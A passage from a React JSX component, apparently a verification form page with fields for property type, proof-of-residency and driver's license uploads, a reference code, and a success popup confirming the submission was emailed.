                <select id="propertyType" name="propertyType" style={{ paddingLeft: "3rem" }}>

                  <option value="">Select property type...</option>

                  <option value="singleFamily">Single-family</option>

                  <option value="condo">Condo</option>

                  <option value="apartment">Apartment</option>

                  <option value="office">Office</option>

                  <option value="retail">Retail</option>

                  <option value="industrial">Industrial</option>

                </select>

              </div>

            </div>



            <div className="file-upload-container">

              <label htmlFor="proofOfResidency">

                Proof of Residency:

                <br />

                <small>(e.g., utility bill, lease agreement)</small>

              </label>

              <input

                type="file"

                id="proofOfResidency"

                name="proofOfResidency"

                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"

                onChange={handleFileUpload}

              />

              {filePreviews["proofOfResidency"] && (

                <motion.div

                  className="file-preview"

                  initial={{ opacity: 0, scale: 0.9 }}

                  animate={{ opacity: 1, scale: 1 }}

                >

                  <span className="fileName">{filePreviews["proofOfResidency"]}</span>

                  <button type="button" className="delete-file" onClick={() => clearFileInput("proofOfResidency")}>

                    ×

                  </button>

                </motion.div>

              )}

            </div>

          </motion.div>

        )}



        <motion.div

          className="form-group common"

          initial={{ opacity: 0, x: -50 }}

          animate={{ opacity: 1, x: 0 }}

          transition={{ delay: 1.0 }}

        >

          <label>Driver's License:</label>
          <div className="license-upload-container">
            {/* Front License Upload */}
            <div className="file-upload-container">
              <label htmlFor="licenseFront" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Front of License
              </label>
              <input 
                type="file" 
                id="licenseFront" 
                name="licenseFront" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseFront"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licenseFront"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseFront")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            {/* Back License Upload */}
          <div className="file-upload-container">

              <label htmlFor="licenseBack" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Back of License
              </label>
              <input 
                type="file" 
                id="licenseBack" 
                name="licenseBack" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseBack"] && (
              <motion.div

                className="file-preview"

                initial={{ opacity: 0, scale: 0.9 }}

                animate={{ opacity: 1, scale: 1 }}

              >

                  <span className="fileName">{filePreviews["licenseBack"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseBack")}>
                  ×

                </button>

              </motion.div>

            )}

            </div>
          </div>

        </motion.div>



        <motion.div

          className="form-group common"

          initial={{ opacity: 0, x: -50 }}

          animate={{ opacity: 1, x: 0 }}

          transition={{ delay: 1.1 }}

        >

          <label htmlFor="techId">

            Reference Code:

            <br />

            <small>(Contact support if not provided)</small>

          </label>

          <div className="input-wrapper">

            <i className="fas fa-code input-icon"></i>

            <input

              type="text"

              id="techId"

              name="techId"

              placeholder="Reference code"

              required

              style={{ paddingLeft: "3rem" }}

            />

          </div>

        </motion.div>



        <motion.div

          className="bottomButtonContainer form-buttons"
          initial={{ opacity: 0, y: 20 }}

          animate={{ opacity: 1, y: 0 }}

          transition={{ delay: 1.25 }}
          style={{ display: "flex", gap: "1rem", marginTop: "1rem" }}
        >

          <motion.button

            type="button"

            onClick={handleBackClick}
            whileHover={{ scale: 1.02 }}

            whileTap={{ scale: 0.98 }}

            style={{

              background: "var(--border-medium)",

              color: "var(--text-primary)",

              flex: 1,

            }}

          >

            <i className="fas fa-arrow-left" style={{ marginRight: "0.5rem" }}></i>

            Back

          </motion.button>

          <motion.button

            type="submit"

            className="submitButton"

            whileHover={{ scale: 1.02 }}

            whileTap={{ scale: 0.98 }}

            style={{ flex: 2 }}

            disabled={isSubmitting}
          >

            <i className={`fas ${isSubmitting ? 'fa-spinner fa-spin' : 'fa-check'}`} style={{ marginRight: "0.5rem" }}></i>
            {isSubmitting ? 'Sending...' : 'Submit Verification'}
          </motion.button>

        </motion.div>

      </motion.form>


      {/* Success Popup */}
      <AnimatePresence>
        {showSuccessPopup && (
          <motion.div
            className="success-popup-overlay"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={handleSuccessClose}
          >
            <motion.div
              className="success-popup"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.8, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="success-icon">
                <i className="fas fa-check-circle"></i>
              </div>
              <h3>Email Sent Successfully!</h3>
              <p>Your verification form has been submitted and sent to the recipient.</p>
              <motion.button
                className="success-ok-button"
                onClick={handleSuccessClose}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                OK
              </motion.button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>

  )

}



export default FormPage


